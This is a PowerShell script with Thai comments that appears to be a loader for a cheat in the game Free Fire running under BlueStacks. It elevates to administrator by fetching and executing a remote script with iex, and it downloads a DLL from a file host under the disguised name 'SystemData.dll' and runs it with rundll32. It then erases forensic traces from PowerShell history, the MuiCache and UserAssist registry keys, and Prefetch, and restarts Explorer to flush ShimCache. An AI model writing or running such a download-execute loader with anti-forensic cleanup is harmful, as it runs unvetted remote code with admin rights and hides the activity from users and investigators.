# 1. ตรวจสอบสิทธิ์ Administrator (ถ้าไม่มีให้ขอสิทธิ์)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex (Invoke-RestMethod 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# 2. ตั้งค่าไฟล์และตำแหน่ง (เน้นความเนียน)
$url = "https://files.catbox.moe/0ukxya.dll"
$fileName = "SystemData.dll" # ชื่อไฟล์ที่ใช้บันทึกในเครื่อง
$workDir = "$env:LOCALAPPDATA\Temp\SysUpdate"
$dllPath = Join-Path $workDir $fileName
$blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe" # Path มาตรฐาน BlueStacks 5

# 3. สร้างโฟลเดอร์ทำงานชั่วคราว
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 4. ดาวน์โหลด DLL จาก URL ที่กำหนด
try {
    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Host "[-] Download failed." -ForegroundColor Red
    exit
}

# 5. การสั่งรัน BlueStacks ผ่าน DLL (Rundll32)
if (Test-Path $dllPath) {
    if (Test-Path $blueStacksPath) {
        Write-Host "[*] Launching BlueStacks via DLL Proxy..." -ForegroundColor Cyan
        # รัน DLL และส่ง Path BlueStacks เข้าไป (ใช้ Control_RunDLL เป็นจุดรันมาตรฐาน)
        Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$dllPath`",Control_RunDLL `"$blueStacksPath`"" -WorkingDirectory $workDir -Wait
    } else {
        Write-Host "[-] BlueStacks not found at default location." -ForegroundColor Yellow
        # ถ้าหาไม่เจอ ให้รัน DLL ตัวเปล่าเผื่อมีการตั้งค่าภายในไว้แล้ว
        Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$dllPath`",Control_RunDLL" -WorkingDirectory $workDir -Wait
    }
}

# 6. --- กระบวนการทำลายร่องรอย (The Deep Clean) ---
Write-Host "[*] Cleaning all activity traces..." -ForegroundColor Yellow

# ลบไฟล์ DLL และโฟลเดอร์ทำงาน
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

# ลบประวัติคำสั่ง PowerShell (ConsoleHost_history)
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
Clear-History

# ลบชื่อโปรแกรม/DLL ออกจาก MuiCache (Registry หลักที่ LastActivityView ตรวจสอบ)
$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fileName*" -or $_ -like "*rundll32*" } | ForEach-Object {
    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
}

# ลบประวัติการรันใน UserAssist (Registry ที่เก็บประวัติการเปิดโปรแกรมของ User)
$uaPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
Get-ChildItem -Path $uaPath -ErrorAction SilentlyContinue | Get-ChildItem | Get-ChildItem | Where-Object { $_.Name -like "*$fileName*" } | Remove-Item -Force -ErrorAction SilentlyContinue

# ลบไฟล์ Prefetch ที่เกี่ยวข้อง
Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*RUNDLL32*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# ปิดและเปิด Explorer ใหม่ (เพื่อบีบให้ Windows ล้าง ShimCache ใน RAM ลง Registry และเคลียร์ร่องรอย)
Stop-Process -Name Explorer -Force -ErrorAction SilentlyContinue
Start-Process Explorer

Write-Host "[+] All traces cleared successfully." -ForegroundColor Green